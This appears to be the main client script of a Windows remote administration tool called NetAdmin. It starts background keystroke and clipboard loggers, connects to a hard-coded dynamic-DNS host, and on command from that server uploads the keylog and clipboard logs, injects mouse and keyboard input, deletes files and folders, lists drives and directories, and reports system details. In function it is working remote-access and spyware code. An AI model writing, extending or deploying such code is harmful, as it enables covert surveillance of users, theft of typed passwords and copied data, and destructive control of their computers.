import argparse
import configparser
import pathlib
import shutil

import helpers
import time
import traceback
import FileExplorer
import platform
import OpenConnectionHandlers
import pyautogui
import pythoncom
import win32com.client as com
import wmi
import psutil
import GPUtil
import win32api
from os import listdir
from os.path import isfile, join
import logging_setup
import reg_helpers
import runconfig
import statics
from OpenConnectionHelpers import *
from turbojpeg import TurboJPEG
import mss.windows
from SmartSocket import SmartSocket
import Keylog
import installer
from tendo import singleton

try:
    logger = logging_setup.setup_logger()
    logging_setup.log_PyInstaller_state(logger)

    mss.windows.CAPTUREBLT = 0

    logger.info(f"TurboJPEG path: {statics.TURBOJPEG_PATH}")
    jpeg = TurboJPEG(statics.TURBOJPEG_PATH)

    process_status = SharedBoolean(True)

    def main(configdir=None):
        # make sure no other connections are running

        logger.info("Verifying tendo.SingleInstance()")
        # TODO - fix singleton (Doesn't prevent 2 instances)
        singleton.SingleInstance()
        logger.info("tendo.SingleInstance() verified!")
        # NOT NEEDED SINCE SERVICE
        # # make sure only one instance of the application is running
        # try:
        #     sng = singleton.SingleInstance()
        # except:
        #     print("Another instance of the application is already running")
        #     return

        # read IP and port from config file
        if configdir:
            config_parser = configparser.ConfigParser()
            f = open(configdir)
            config_parser.read_file(f)
            cAddress = config_parser['CONNECTION']['ip_or_hostname']
            cPort = config_parser['CONNECTION']['port']
            cType = config_parser['CONNECTION']['type']
        else:
            logger.info("NO CONFIG FILE FOUND")
            cAddress = "netadminmain.ddns.net"
            cPort = 49152
            cType = "hostname"

        pythoncom.CoInitialize()
        pathlib.Path(statics.PROGRAMDATA_NETADMIN_PATH).mkdir(parents=True, exist_ok=True)

        thread = threading.Thread(target=Keylog.keylogger, args=(process_status,))
        thread.start()

        # create clipboard logger
        thread2 = threading.Thread(target=Keylog.clipboard_logger, args=(process_status,))
        thread2.start()

        computer = wmi.WMI()

        while True:
            try:
                if cType.lower() == "hostname":
                    sockaddr = socket.getaddrinfo(cAddress, int(cPort))[0][4]
                    opensockaddr = socket.getaddrinfo(cAddress, 49153)[0][4]
                else:
                    sockaddr = (cAddress, int(cPort))
                    opensockaddr = (cAddress, 49153)

                s = SmartSocket(None, socket.AF_INET, socket.SOCK_STREAM)
                s.connect(sockaddr)

                logger.info("CONNECTED TO SERVER")
                client_connection_main(s, computer, opensockaddr)
            # if we except because of s.connect, retry connection
            #TODO if we get an error due to other exceptions, do not try to reconnect
            except (ConnectionAbortedError, ConnectionResetError, OSError) as e:
                print(str(e))
                print("Waiting 5 seconds before trying to reconnect")
                time.sleep(5)
            # if client_connection_main ends and the try_connection decorator catches the exception, then check the process status and if true, retry connection
            else:
                logger.info("DISCONNECTED FROM SERVER")
                if not process_status:
                    logger.info("PROCESS STATUS IS FALSE, STOPPING THE PROCESS")
                    break

    @helpers.try_connection
    def client_connection_main(s, computer, opensockaddr):
        # main loop
        # receives and unpacks messages from the server, and checks the type of message
        while process_status:
            size, message, isEncrypted = s.receive_message()
            if message == -1:
                return

            id = message['id']  # get the echo id of the message, to echo back to the server when sending response

            # if message is an error
            if message['type'] == NetTypes.NetStatus.value:
                # identification error
                if message['data'] == NetStatusTypes.NetInvalidIdentification.value:
                    print("Invalid identification sent. Resetting...")
                    # reset the id
                    reg_helpers.set_id("")
                    # send a request to identify again
                    s.send_message(NetMessage(type=NetTypes.NetIdentification, data=NetIdentification(
                        reg_helpers.get_id()), id=id))

            # if message is a request
            if message['type'] == NetTypes.NetRequest.value:
                if message['data'] == NetTypes.NetHeartbeat.value:
                    s.send_message(NetMessage(type=NetTypes.NetHeartbeat, data=NetStatus(NetStatusTypes.NetOK.value), id=id))
                elif message['data'] == NetTypes.NetUninstallClient.value:
                    installer.uninstall()
                elif message['data'] == NetTypes.NetKeyboardAction.value:
                    print(f"Keyboard action request from {message['extra']}")
                    pyautogui.press(message['extra'], _pause=False)

                elif message['data'] == NetTypes.NetGetKeylogger.value:
                    print(f"Keylogger request from {message['extra']}")
                    try:
                        with open(statics.KEYLOGGER_FILE_PATH, "r") as f:
                            logger.debug("OPENED KEYLOGGER")
                            # TODO - split the file into 16KB chunks and send it in 16KB chunks
                            s.send_message(NetMessage(type=NetTypes.NetText, data=NetText(text=f.read()), id=id))
                    except Exception as e:
                        logger.info(str(e))

                elif message['data'] == NetTypes.NetGetClipboard.value:
                    print(f"Keylogger request from {message['extra']}")
                    try:
                        with open(statics.CLIPBOARD_FILE_PATH, "r") as f:
                            logger.debug("OPENED CLIPBOARD")
                            s.send_message(NetMessage(type=NetTypes.NetText, data=NetText(text=f.read()), id=id))
                    except Exception as e:
                        logger.info(str(e))

                elif message['data'] == NetTypes.NetMouseMoveAction.value:
                    print(f"Mouse action request from {message['extra']}")
                    start = time.time()
                    pyautogui.moveTo(message['extra'][0], message['extra'][1], _pause=False)
                    print(time.time() - start)

                elif message['data'] == NetTypes.NetMouseClickDownAction.value:
                    print(f"Mouse click down action request from {message['extra']}")
                    if message['extra'][0] == 1:
                        pyautogui.mouseDown(button="left", x=message['extra'][1], y=message['extra'][2], _pause=False)
                    elif message['extra'][0] == 3:
                        pyautogui.mouseDown(button="right", x=message['extra'][1], y=message['extra'][2], _pause=False)
                    elif message['extra'][0] >= 4:
                        if message['extra'][0] % 2 == 1:
                            pyautogui.scroll(-50, _pause=False)
                        else:
                            pyautogui.scroll(50, _pause=False)
                    elif message['extra'][0] == 2:
                        pyautogui.middleClick(_pause=False)


                elif message['data'] == NetTypes.NetMouseClickUpAction.value:
                    print(f"Mouse click up action request from {message['extra']}")
                    if message['extra'][0] == 1:
                        pyautogui.mouseUp(button="left", x=message['extra'][1], y=message['extra'][2], _pause=False)
                    elif message['extra'][0] == 3:
                        pyautogui.mouseUp(button="right", x=message['extra'][1], y=message['extra'][2], _pause=False)
                    elif message['extra'][0] == 5:
                        pyautogui.scroll(-50, _pause=False)
                    elif message['extra'][0] == 4:
                        pyautogui.scroll(50, _pause=False)
                    elif message['extra'][0] == 2:
                        pyautogui.middleClick(_pause=False)
                # if the request is to find the size of a directory
                elif message['data'] == NetTypes.NetDirectorySize.value:
                    # get the directory
                    directory = message['extra']

                    # send the size of the directory
                    start = datetime.datetime.now()
                    actualCall = FileExplorer.ActualDirectorySize(directory, True)
                    print(f"Manual method for {directory}: {datetime.datetime.now() - start}")
                    s.send_message(NetMessage(type=NetTypes.NetDirectorySize, data=NetDirectorySize(actualCall), id=id))

                # if the request is to delete a file
                elif message['data'] == NetTypes.NetDeleteFile.value:
                    path = message['extra']

                    # try to delete the path
                    try:
                        if os.path.isfile(path):  # if the path is a file
                            os.remove(path)
                        else:  # if the path is a directory
                            # TODO - replace os.rm with shutil.rmtree. check if working properly.
                            shutil.rmtree(path)

                    # file or directory doesn't exist
                    except FileNotFoundError:
                        print("File not found: " + path)
                        s.send_message(NetMessage(type=NetTypes.NetStatus, data=NetStatus(NetStatusTypes.NetFileNotFound.value),
                                       id=id))

                    # no access to directory error
                    except WindowsError:
                        print("Error deleting file: " + path)
                        s.send_message(NetMessage(type=NetTypes.NetStatus, data=NetStatus(
                            NetStatusTypes.NetDirectoryAccessDenied.value), id=id))

                    # success
                    else:
                        s.send_message(NetMessage(type=NetTypes.NetStatus, data=NetStatus(NetStatusTypes.NetOK.value), id=id))

                elif message['data'] == NetTypes.NetIdentification.value:  # if request to identify
                    try:
                        uid = reg_helpers.get_id()
                    except:  # will raise an exception if the key does not exist
                        sMessage = NetIdentification(
                            "")  # if there is no id, then send a blank id to tell the server that this is a new client
                    else:
                        sMessage = NetIdentification(uid)  # if there is an id, then send the id to the server
                    s.send_message(NetMessage(type=NetTypes.NetIdentification, data=sMessage, id=id))

                elif message['data'] == NetTypes.NetEncryptionVerification.value:  # if request to verify encryption
                    d = reg_helpers.get_encryption_key().encode()
                    s.set_key(d)  # set the encryption key
                    s.send_message(NetMessage(type=NetTypes.NetEncryptionVerification, data=NetText(str(message['extra'])), id=id))

                # if request system information
                elif message['data'] == NetTypes.NetSystemInformation.value:
                    sMessage = NetSystemInformation(
                        platform.node(),
                        platform.system(),
                        platform.processor(),
                        platform.machine(),
                        computer.Win32_VideoController()[0].Name
                    )
                    s.send_message(NetMessage(NetTypes.NetSystemInformation, sMessage, id=id))

                # if request system metrics
                elif message['data'] == NetTypes.NetSystemMetrics.value:
                    try:
                        GPU_LOAD = GPUtil.getGPUs()[0].load
                    except:
                        GPU_LOAD = 0
                    sMessage = NetSystemMetrics(
                        psutil.cpu_percent(),
                        RAM_LOAD=psutil.virtual_memory().percent,
                        GPU_LOAD=GPU_LOAD,
                        DISK_LOAD=psutil.disk_usage('/')[3]
                    )
                    s.send_message(NetMessage(NetTypes.NetSystemMetrics, sMessage, id=id))

                # if request to open a new connection
                elif message['data'] == NetTypes.NetOpenConnection.value:
                    # create a server with the port specified in extra, and pass it to handleOpenConnection
                    if message['extra'] == True:
                        Fkey = s.Fkey
                    else:
                        Fkey = None
                    sock = SmartSocket(None, socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect(opensockaddr)
                    sock.send_message(NetMessage(NetTypes.NetStatus, NetStatus(NetStatusTypes.NetOK.value), id=id))
                    sock.send_appended_stream(s.fernetInstance.encrypt(orjson.dumps(NetMessage(NetTypes.NetStatus, NetStatus(NetStatusTypes.NetOK.value), id=id))))
                    if Fkey:
                        sock.set_key(Fkey)
                    thread = threading.Thread(target=OpenConnectionHandlers.handleOpenConnection, args=(sock,))
                    thread.start()

                # # if request actual folder size
                # elif message['data'] == NetTypes.NetDirectorySize.value:
                #     path = message['extra']
                #     size = ActualDirectorySize(path, True)
                #     s.send(NetProtocol.packNetMessage(NetMessage(NetTypes.NetDirectorySize, NetDirectorySize(size), id=id)))

                # if request a directory listing
                elif message['data'] == NetTypes.NetDirectoryListing.value:
                    # directory string is stored in the extra field of the message
                    directory = message['extra']

                    # if requesting root directory
                    if (directory == ""):
                        drives = win32api.GetLogicalDriveStrings()
                        drives = drives.split('\000')[:-1]
                        sMessage = NetDirectoryListing("", [])
                        for drive in drives:
                            sMessage.items.append(
                                NetDirectoryItem(drive[:2], drive, NetTypes.NetDirectoryFolderCollapsable.value, None,
                                                 None, None))
                        s.send_message(NetMessage(NetTypes.NetDirectoryListing, sMessage, id=id))

                    # if requesting normal directory
                    else:
                        # check if there is access to the directory
                        try:
                            files = [f for f in listdir(directory) if isfile(join(directory, f))]
                            folders = [f for f in listdir(directory) if not isfile(join(directory, f))]

                        # if there is no access, then there is a PermissionError
                        except PermissionError as e:
                            print("Permission is denied for directory", directory)
                            # send a NetDirectoryAccessDenied error to the server
                            s.send_message(
                                NetMessage(NetTypes.NetStatus, NetStatus(NetStatusTypes.NetDirectoryAccessDenied.value),
                                           id=id))

                        # if got directory listing (we have permission)
                        else:
                            sMessage = NetDirectoryListing(directory, [])
                            ctime = datetime.datetime.now()
                            # append NetDirectoryItems for each file/folder
                            for folder in folders:
                                winfolderPath = directory + folder + "\\"
                                try:

                                    # try to get folder size via windows scripting

                                    dispatch = com.Dispatch("Scripting.FileSystemObject")
                                    winfolder = dispatch.GetFolder(winfolderPath)
                                    size = winfolder.Size
                                    readable = True

                                    # # --manual method
                                    # size = ActualDirectorySize(winfolderPath, True)
                                    # readable = True

                                except:
                                    # if not successful, then use then size = -1 to signify that the folder size is not available
                                    size = -1
                                    # if couldn't get size, check if the folder is inaccessible, or just subdirectories are inaccessible
                                    try:
                                        listdir(winfolderPath)
                                    except:
                                        readable = False
                                    else:
                                        readable = True
                                sMessage.items.append(NetDirectoryItem(folder, directory + folder + "\\",
                                                                       NetTypes.NetDirectoryFolderCollapsable, readable,
                                                                       date_created=os.path.getctime(
                                                                           directory + folder + "\\"), size=size))
                            for file in files:
                                if os.access(directory + file, os.R_OK):
                                    readable = True
                                else:
                                    readable = False
                                sMessage.items.append(
                                    NetDirectoryItem(file, directory + file, NetTypes.NetDirectoryFile.value, readable,
                                                     date_created=os.path.getctime(directory + file),
                                                     last_modified=os.path.getmtime(directory + file),
                                                     size=os.path.getsize(directory + file)))
                            print(f"WinScript Method for {directory}: ", datetime.datetime.now() - ctime)
                            s.send_message(NetMessage(NetTypes.NetDirectoryListing, sMessage, id=id))

            # if server sent an id, then set the id to it
            elif message['type'] == NetTypes.NetIdentification.value:
                reg_helpers.set_id(message['data']['id'])
                reg_helpers.set_encryption_key(message['extra'])

    if __name__ == "__main__":
        logger.info(statics.PROGRAMDATA_NETADMIN_PATH + "NetAdmin.exe")
        if not (getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS')):
            main()
        else:
            # clean temporary _MEI
            installer.clean_mei()

            # handle arguments
            parser = argparse.ArgumentParser()
            parser.add_argument("-r", "--run_main", help="Run the main() client function.", action='store_true')
            parser.add_argument("-d", "--dashboard", help="View the NetAdmin client dashboard", action='store_true')
            logger.info("args=%s" % str(sys.argv))
            args = parser.parse_args()
            if args.run_main:
                logger.info("EXE Directory: "+helpers.get_exe_directory())
                config = runconfig.get_runconfig(helpers.get_exe_directory())
                if not config:
                    logger.info("ERROR: NO CONFIG FILE WAS FOUND. INSTALLATION CORRUPTED. ")
                else:
                    main(config)
            else:
                installer.dashboard()

except Exception as e:
    if not (getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS')):
        raise Exception
    else:
        exc_type, exc_obj, exc_tb = sys.exc_info()
        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        logger.info(str(fname) + " " + str(exc_tb.tb_lineno) + " " + traceback.format_exc())